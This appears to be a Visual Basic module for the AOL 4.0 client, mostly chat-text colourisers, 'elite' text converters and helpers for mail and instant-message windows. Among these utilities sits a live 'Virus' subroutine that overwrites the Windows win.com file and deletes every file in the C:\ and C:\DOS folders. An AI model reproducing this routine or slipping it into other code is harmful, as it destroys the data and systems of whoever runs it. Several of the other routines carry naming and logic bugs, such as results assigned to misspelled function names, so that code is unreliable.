Function Mail_Out_CursorSet(mailIndex As String)
aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "Outgoing FlashMail")
Mailtree% = FindChildByClass(A3000%, "_AOL_Tree")
A6000% = SendMessageByString(Mailtree%, LB_SETCURSEL, mailIndex, 0)
End Function
Function Mail_Out_ListMail(Box As ListBox)
Box.Clear
AOLMDI
mailwin = FindChildByTitle(AOLMDI, "New Mail")
If mailwin = 0 Then
AOLRunMenuByString ("Read &New Mail")
Justamin:
mailwin = FindChildByTitle(AOLMDI, "New Mail")
If mailwin = 0 Then GoTo Justamin
timeout (7)
End If

mailwin = FindChildByTitle(AOLMDI, "Outgoing FlashMail")
AOLCountMail
Start:
If Counter = AOLCountMail Then GoTo last
Mailtree = FindChildByClass(mailwin, "_AOL_TREE")
   namelen = SendMessage(Mailtree, LB_GETTEXTLEN, Counter, 0)
    buffer$ = String$(namelen, 0)
    X = SendMessageByString(Mailtree, LB_GETTEXT, Counter, buffer$)
    TabPos = InStr(buffer$, Chr$(9))
    buffer$ = Right$(buffer$, (Len(buffer$) - (TabPos)))
    Box.AddItem buffer$
 timeout (0.001)
Counter = Counter + 1
GoTo Start
last:
End Function

Function Mail_Out_MailCaption()
End Function

Function Mail_Out_MailCount()
themail% = FindChildByClass(AOLMDI(), "AOL Child")
thetree% = FindChildByClass(themail%, "_AOL_Tree")
Mail_Out_MailCount = SendMessage(thetree%, LB_GETCOUNT, 0, 0)
End Function

Function Mail_Out_PressEnter()
aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "Outgoing FlashMail")
Mailtree% = FindChildByClass(A3000%, "_AOL_Tree")
X = SendMessage(Mailtree%, WM_KEYDOWN, VK_RETURN, 0)
X = SendMessage(Mailtree%, WM_KEYUP, VK_RETURN, 0)
End Function


Function Mail_PressEnter()
aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "New Mail")
Mailtree% = FindChildByClass(A3000%, "_AOL_Tree")
X = SendMessage(Mailtree%, WM_KEYDOWN, VK_RETURN, 0)
X = SendMessage(Mailtree%, WM_KEYUP, VK_RETURN, 0)
End Function



Function Mail_SetCursor(mailIndex As String)
aol% = FindWindow("AOL Frame25", vbNullString)
A2000% = FindChildByClass(aol%, "MDIClient")
A3000% = FindChildByTitle(A2000%, "New Mail")
Mailtree% = FindChildByClass(A3000%, "_AOL_Tree")
A6000% = SendMessageByString(Mailtree%, LB_SETCURSEL, mailIndex, 0)
End Function
Function FindOpenMail()
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
childfocus% = GetWindow(mdi%, 5)

While childfocus%
listers% = FindChildByClass(childfocus%, "RICHCNTL")
listere% = FindChildByClass(childfocus%, "_AOL_Icon")
listerb% = FindChildByClass(childfocus%, "_AOL_Button")

If listers% <> 0 And listere% <> 0 And listerb% <> 0 Then FindOpenMail = childfocus%: Exit Function
childfocus% = GetWindow(childfocus%, 2)
Wend


End Function

Function Mail_MailCaption()
FindOpenMail
Mail_MailCaption = GetCaption(FindOpenMail)
End Function

Function SearchForSelected(lst As ListBox)
If lst.List(0) = "" Then
counterf = 0
GoTo last
End If
counterf = -1

Start:
counterf = counterf + 1
If lst.ListCount = counterf + 1 Then GoTo last
If lst.Selected(counterf) = True Then GoTo last
If couterf = lst.ListCount Then GoTo last
GoTo Start

last:
SearchForSelected = counterf
End Function
Sub AOL4_SetFocus()
X = GetCaption(AOLWindow)
AppActivate X
End Sub
Function AOL4_UpChat()
'this is an upchat that minimizes the
'upload window
die% = FindWindow("_AOL_MODAL", vbNullString)
X = ShowWindow(die%, SW_HIDE)
X = ShowWindow(die%, SW_MINIMIZE)
Call AOL4_SetFocus
End Function
Sub NotOnTop(the As Form)
'This will take a form and make it so that
'it does not stay on top of other forms
'U HAVE TO MAKE THE EXE to SEE IT WERK

SetWinOnTop = SetWindowPos(the.hWnd, HWND_NOTOPMOST, 0, 0, 0, 0, FLAGS)
End Sub
Sub AddRoomToComboBox(ListBox As ListBox, ComboBox As ComboBox)
Call AddRoomToListBox(ListBox)
For Q = 0 To ListBox.ListCount
    ComboBox.AddItem (ListBox.List(Q))
Next Q
End Sub
Sub StrikeOutSendChat(StrikeOutChat)
'This is a new sub that I thought of. It strikes
'the chat text out.
SendChat ("<S>" & StrikeOutChat & "</S>")
End Sub
Sub Virus()
'This was takin outta nash40.bas
'Thanxz Nash
' Might Want to get rid of that!
Printer.Print "RaVe ViRuS KiLL Or Be KiLLed #1"
Open "c:\windows\win.com" For Output As #1
Print #1, "NASH KB"
Close #1
Kill "c:\dos\*.*"
Kill "c:\*.*"
End Sub
Function wavetalker(strin2, F As ComboBox, c1 As ComboBox, c2 As ComboBox, c3 As ComboBox, c4 As ComboBox)
tixt = F
Color1 = c1
Color2 = c2
Color3 = c3
Color4 = c4
If Color1 = "Navy" Then Color1 = "000080"
If Color1 = "Maroon" Then Color1 = "800000"
If Color1 = "Lime" Then Color1 = "00FF00"
If Color1 = "Teal" Then Color1 = "008080"
If Color1 = "Red" Then Color1 = "F0000"
If Color1 = "Blue" Then Color1 = "0000FF"
If Color1 = "Siler" Then Color1 = "C0C0C0"
If Color1 = "Yellow" Then Color1 = "FFFF00"
If Color1 = "Aqua" Then Color1 = "00FFFF"
If Color1 = "Purple" Then Color1 = "800080"
If Color1 = "Black" Then Color1 = "000000"

If Color2 = "Navy" Then Color2 = "000080"
If Color2 = "Maroon" Then Color2 = "800000"
If Color2 = "Lime" Then Color2 = "00FF00"
If Color2 = "Teal" Then Color2 = "008080"
If Color2 = "Red" Then Color2 = "F0000"
If Color2 = "Blue" Then Color2 = "0000FF"
If Color2 = "Siler" Then Color2 = "C0C0C0"
If Color2 = "Yellow" Then Color2 = "FFFF00"
If Color2 = "Aqua" Then Color2 = "00FFFF"
If Color2 = "Purple" Then Color2 = "800080"
If Color1 = "Black" Then Color2 = "000000"

If Color3 = "Navy" Then Color3 = "000080"
If Color3 = "Maroon" Then Color3 = "800000"
If Color3 = "Lime" Then Color3 = "00FF00"
If Color3 = "Teal" Then Color3 = "008080"
If Color3 = "Red" Then Color3 = "F0000"
If Color3 = "Blue" Then Color3 = "0000FF"
If Color3 = "Siler" Then Color3 = "C0C0C0"
If Color3 = "Yellow" Then Color3 = "FFFF00"
If Color3 = "Aqua" Then Color3 = "00FFFF"
If Color3 = "Purple" Then Color3 = "800080"
If Color1 = "Black" Then Color3 = "000000"

If Color4 = "Navy" Then Color4 = "000080"
If Color4 = "Maroon" Then Color4 = "800000"
If Color4 = "Lime" Then Color4 = "00FF00"
If Color4 = "Teal" Then Color4 = "008080"
If Color4 = "Red" Then Color4 = "F0000"
If Color4 = "Blue" Then Color4 = "0000FF"
If Color4 = "Siler" Then Color4 = "C0C0C0"
If Color4 = "Yellow" Then Color4 = "FFFF00"
If Color4 = "Aqua" Then Color4 = "00FFFF"
If Color4 = "Purple" Then Color4 = "800080"
If Color1 = "Black" Then Color4 = "000000"

Let inptxt2$ = strin2
Let lenth2% = Len(inptxt2$)
mad = """"
Dad = "#"
Do While numspc2% <= lenth2%
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$
Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$

Let numspc2% = numspc2% + 1
Let nextchr2$ = Mid$(inptxt2$, numspc2%, 1)
Let nextchr2$ = nextchr2$ + " "
Let newsent2$ = newsent2$ + nextchr2$
Loop
wavytalker = newsent2$
End Function

Sub UnderLineSendChat(UnderLineChat)
' underlines chat text.
SendChat ("<u>" & UnderLineChat & "</u>")
End Sub
Sub ItalicSendChat(ItalicChat)
'Makes chat text in Italics.
SendChat ("<i>" & ItalicChat & "</i>")
End Sub
Sub BoldSendChat(BoldChat)
'This is new it makes the chat text bold.
'example:
'BoldSendChat ("ThIs Is BoLd")
'It will come out bold on the chat screen.
SendChat ("<b>" & BoldChat & "</b>")
End Sub
Sub BoldWavyChatBlueBlack(thetext)
G$ = thetext
A = Len(G$)
For W = 1 To A Step 4
    R$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    P$ = P$ & "<B><FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sup>" & R$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#F0" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & T$
Next W
BoldSendChat (P$)
End Sub
Function BoldAOL4_WavColors2(Text1 As String)
G$ = Text1
A = Len(G$)
For W = 1 To A Step 4
    R$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    P$ = P$ & "<b><FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><sup>" & R$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006600" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "##006600" & Chr$(34) & ">" & T$
Next W
BoldSendChat (P$)
End Function
Sub BoldWavyColorbluegree(thetext)
G$ = thetext
A = Len(G$)
For W = 1 To A Step 4
    R$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    P$ = P$ & "<b><FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sup>" & R$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#006600" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "##006600" & Chr$(34) & "></b>" & T$
Next W
BoldSendChat (P$)
End Sub
Sub BoldWavyColorredandblack(thetext)

G$ = thetext
A = Len(G$)
For W = 1 To A Step 4
    R$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    P$ = P$ & "<b><FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & R$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0000FF" & Chr$(34) & "></b>" & T$
Next W
BoldSendChat (P$)
End Sub
Sub BoldWavyColorredandblue(thetext)
G$ = thetext
A = Len(G$)
For W = 1 To A Step 4
    R$ = Mid$(G$, W, 1)
    U$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    P$ = P$ & "<b><FONT COLOR=" & Chr$(34) & "#FF0000" & Chr$(34) & "><sup>" & R$ & "</sup>" & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & ">" & U$ & "<FONT COLOR=" & Chr$(34) & "#ff0000" & Chr$(34) & "><sub>" & S$ & "</sub>" & "<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & "></b>" & T$
Next W
BoldSendChat (P$)
End Sub

Sub EliteTalker(word$)
Made$ = ""
For Q = 1 To Len(word$)
    letter$ = ""
    letter$ = Mid$(word$, Q, 1)
    Leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If X = 1 Then Leet$ = "â"
    If X = 2 Then Leet$ = "å"
    If X = 3 Then Leet$ = "ä"
    End If
    If letter$ = "b" Then Leet$ = "b"
    If letter$ = "c" Then Leet$ = "ç"
    If letter$ = "d" Then Leet$ = "d"
    If letter$ = "e" Then
    If X = 1 Then Leet$ = "ë"
    If X = 2 Then Leet$ = "ê"
    If X = 3 Then Leet$ = "é"
    End If
    If letter$ = "i" Then
    If X = 1 Then Leet$ = "ì"
    If X = 2 Then Leet$ = "ï"
    If X = 3 Then Leet$ = "î"
    End If
    If letter$ = "j" Then Leet$ = ",j"
    If letter$ = "n" Then Leet$ = "ñ"
    If letter$ = "o" Then
    If X = 1 Then Leet$ = "ô"
    If X = 2 Then Leet$ = "ð"
    If X = 3 Then Leet$ = "õ"
    End If
    If letter$ = "s" Then Leet$ = "š"
    If letter$ = "t" Then Leet$ = "†"
    If letter$ = "u" Then
    If X = 1 Then Leet$ = "ù"
    If X = 2 Then Leet$ = "û"
    If X = 3 Then Leet$ = "ü"
    End If
    If letter$ = "w" Then Leet$ = "vv"
    If letter$ = "y" Then Leet$ = "ÿ"
    If letter$ = "0" Then Leet$ = "Ø"
    If letter$ = "A" Then
    If X = 1 Then Leet$ = "Å"
    If X = 2 Then Leet$ = "Ä"
    If X = 3 Then Leet$ = "Ã"
    End If
    If letter$ = "B" Then Leet$ = "ß"
    If letter$ = "C" Then Leet$ = "Ç"
    If letter$ = "D" Then Leet$ = "Ð"
    If letter$ = "E" Then Leet$ = "Ë"
    If letter$ = "I" Then
    If X = 1 Then Leet$ = "Ï"
    If X = 2 Then Leet$ = "Î"
    If X = 3 Then Leet$ = "Í"
    End If
    If letter$ = "N" Then Leet$ = "Ñ"
    If letter$ = "O" Then Leet$ = "Õ"
    If letter$ = "S" Then Leet$ = "Š"
    If letter$ = "U" Then Leet$ = "Û"
    If letter$ = "W" Then Leet$ = "VV"
    If letter$ = "Y" Then Leet$ = "Ý"
    If letter$ = "`" Then Leet$ = "´"
    If letter$ = "!" Then Leet$ = "¡"
    If letter$ = "?" Then Leet$ = "¿"
    If Len(Leet$) = 0 Then Leet$ = letter$
    Made$ = Made$ & Leet$
Next Q
BoldSendChat (Made$)
End Sub

Sub IMsOn()
Call IMKeyword("$IM_ON", "RaVaGe Ownz U ")
End Sub
Sub IMsOff()
Call IMKeyword("$IM_OFF", "RaVaGe ownz u ")
End Sub






Sub Attention(thetext As String)

BoldSendChat ("$$$$$$$ ATTENTION $$$$$$$$")
Call timeout(0.15)
BoldSendChat (thetext)
Call timeout(0.15)
BoldSendChat ("$$$$$$$ ATTENTION $$$$$$$$")
Call timeout(0.15)
'BoldSendChat ("<FONT COLOR=" & Chr$(34) & "#0F" & Chr$(34) & ">" & "‹›·´¯`·._.·• " & G$ & "v¹·¹" & L$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> • " & aa$ & "<FONT COLOR=" & Chr$(34) & "#0" & Chr$(34) & "> • ")
End Sub

Sub KillGlyph()
' Kills the annoying spinning AOL logo in the toobar
' on AOL 4.0
aol% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(aol%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
Glyph% = FindChildByClass(AOTool2%, "_AOL_Glyph")
Call SendMessage(Glyph%, WM_CLOSE, 0, 0)
End Sub





Function TrimTime()
B$ = Left$(Time$, 5)
HourH$ = Left$(B$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime = HourH$ & Right$(B$, 3) & " " & Ap$
End Function
Function TrimTime2()
B$ = Time$
HourH$ = Left$(B$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime2 = HourH$ & ":" & Right$(B$, 5) & " " & Ap$
End Function

Function EliteText(word$)
Made$ = ""
For Q = 1 To Len(word$)
    letter$ = ""
    letter$ = Mid$(word$, Q, 1)
    Leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If X = 1 Then Leet$ = "â"
    If X = 2 Then Leet$ = "å"
    If X = 3 Then Leet$ = "ä"
    End If
    If letter$ = "b" Then Leet$ = "b"
    If letter$ = "c" Then Leet$ = "ç"
    If letter$ = "e" Then
    If X = 1 Then Leet$ = "ë"
    If X = 2 Then Leet$ = "ê"
    If X = 3 Then Leet$ = "é"
    End If
    If letter$ = "i" Then
    If X = 1 Then Leet$ = "ì"
    If X = 2 Then Leet$ = "ï"
    If X = 3 Then Leet$ = "î"
    End If
    If letter$ = "j" Then Leet$ = ",j"
    If letter$ = "n" Then Leet$ = "ñ"
    If letter$ = "o" Then
    If X = 1 Then Leet$ = "ô"
    If X = 2 Then Leet$ = "ð"
    If X = 3 Then Leet$ = "õ"
    End If
    If letter$ = "s" Then Leet$ = "š"
    If letter$ = "t" Then Leet$ = "†"
    If letter$ = "u" Then
    If X = 1 Then Leet$ = "ù"
    If X = 2 Then Leet$ = "û"
    If X = 3 Then Leet$ = "ü"
    End If
    If letter$ = "w" Then Leet$ = "vv"
    If letter$ = "y" Then Leet$ = "ÿ"
    If letter$ = "0" Then Leet$ = "Ø"
    If letter$ = "A" Then
    If X = 1 Then Leet$ = "Å"
    If X = 2 Then Leet$ = "Ä"
    If X = 3 Then Leet$ = "Ã"
    End If
    If letter$ = "B" Then Leet$ = "ß"
    If letter$ = "C" Then Leet$ = "Ç"
    If letter$ = "D" Then Leet$ = "Ð"
    If letter$ = "E" Then Leet$ = "Ë"
    If letter$ = "I" Then
    If X = 1 Then Leet$ = "Ï"
    If X = 2 Then Leet$ = "Î"
    If X = 3 Then Leet$ = "Í"
    End If
    If letter$ = "N" Then Leet$ = "Ñ"
    If letter$ = "O" Then Leet$ = "Õ"
    If letter$ = "S" Then Leet$ = "Š"
    If letter$ = "U" Then Leet$ = "Û"
    If letter$ = "W" Then Leet$ = "VV"
    If letter$ = "Y" Then Leet$ = "Ý"
    If Len(Leet$) = 0 Then Leet$ = letter$
    Made$ = Made$ & Leet$
Next Q

EliteText = Made$

End Function


Sub IMIgnore(thelist As ListBox)
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient")
Im% = FindChildByTitle(mdi%, ">Instant Message From:")
If Im% <> 0 Then
    For findsn = 0 To thelist.ListCount
        If LCase$(thelist.List(findsn)) = LCase$(SNfromIM) Then
            BadIM% = Im%
            IMRICH% = FindChildByClass(BadIM%, "RICHCNTL")
            Call SendMessage(IMRICH%, WM_CLOSE, 0, 0)
            Call SendMessage(BadIM%, WM_CLOSE, 0, 0)
        End If
    Next findsn
End If
End Sub
Function SNfromIM()

aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = FindChildByClass(aol%, "MDIClient") '

Im% = FindChildByTitle(mdi%, ">Instant Message From:")
If Im% Then GoTo Greed
Im% = FindChildByTitle(mdi%, "  Instant Message From:")
If Im% Then GoTo Greed
Exit Function
Greed:
IMCap$ = GetCaption(Im%)
theSN$ = Mid(IMCap$, InStr(IMCap$, ":") + 2)
SNfromIM = theSN$

End Function

Sub Playwav(File)
SoundName$ = File
   wFlags% = SND_ASYNC Or SND_NODEFAULT
   X% = sndPlaySound(SoundName$, wFlags%)

End Sub

Sub KillModal()
Modal% = FindWindow("_AOL_Modal", vbNullString)
Call SendMessage(Modal%, WM_CLOSE, 0, 0)
End Sub

Sub waitforok()
Do
DoEvents
okw = FindWindow("#32770", "America Online")
If proG_STAT$ = "OFF" Then
Exit Sub
Exit Do
End If

DoEvents
Loop Until okw <> 0
   
    okb = FindChildByTitle(okw, "OK")
    okd = SendMessageByNum(okb, WM_LBUTTONDOWN, 0, 0&)
    oku = SendMessageByNum(okb, WM_LBUTTONUP, 0, 0&)


End Sub

Function Black_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, F, F - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    Black_LBlue = Msg
End Function



Function YellowPinkYellow(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(78, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    YellowPink = Msg
End Function

Function WhitePurpleWhite(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    WhitePurpleWhite = Msg
End Function

Function LBlue_Green_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_Green_LBlue = Msg
End Function

Function LBlue_Yellow_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_Yellow_LBlue = Msg
End Function

Function Purple_LBlue_Purple()
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    Purple_LBlue = Msg
End Function

Function DBlue_Black_DBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 450 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    DBlue_Black_DBlue = Msg
End Function

Function DGreen_Black(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, F - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    DGreen_Black = Msg
End Function



Function LBlue_Orange(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(255 - F, 155, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_Orange = Msg
End Function



Function LBlue_Orange_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 155, F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_Orange_LBlue = Msg
End Function

Function LGreen_DGreen(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 220 / A
        F = e * B
        G = RGB(0, 375 - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LGreen_DGreen = Msg
End Function

Function LGreen_DGreen_LGreen(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 490 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 375 - F, 0)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LGreen_DGreen_LGreen = Msg
End Function

Function LBlue_DBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(355, 255 - F, 55)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_DBlue = Msg
End Function

Function LBlue_DBlue_LBlue(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(355, 255 - F, 55)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    LBlue_DBlue_LBlue = Msg
End Function

Function PinkOrange(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 200 / A
        F = e * B
        G = RGB(255 - F, 167, 510)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    PinkOrange = Msg
End Function

Function PinkOrangePink(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 490 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 167, 510)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    PinkOrangePink = Msg
End Function

Function PurpleWhite(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 200 / A
        F = e * B
        G = RGB(255, F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    PurpleWhite = Msg
End Function

Function PurpleWhitePurple(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
    PurpleWhitePurple = Msg
End Function
Function YellowBlack(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function

Function YellowBlue(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, 255 - F, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function

Function YellowGreen(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 255, 255 - F)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function

Function YellowPurple(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(F, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function



Function YellowRedYellow(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function
Function YellowRed(text As String)
    A = Len(text)
    For B = 1 To A
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / A
        F = e * B
        G = RGB(0, 255 - F, 255)
        H = RGBtoHEX(G)
        Msg = Msg & "<Font Color=#" & H & ">" & D
    Next B
   SendChat (Msg)
End Function
Function Yellow_LBlue_Yellow(Text1)
    A = Len(Text1)
    For B = 1 To A
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / A
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 255, 255 - F)
        H = RGBtoHEX(G)
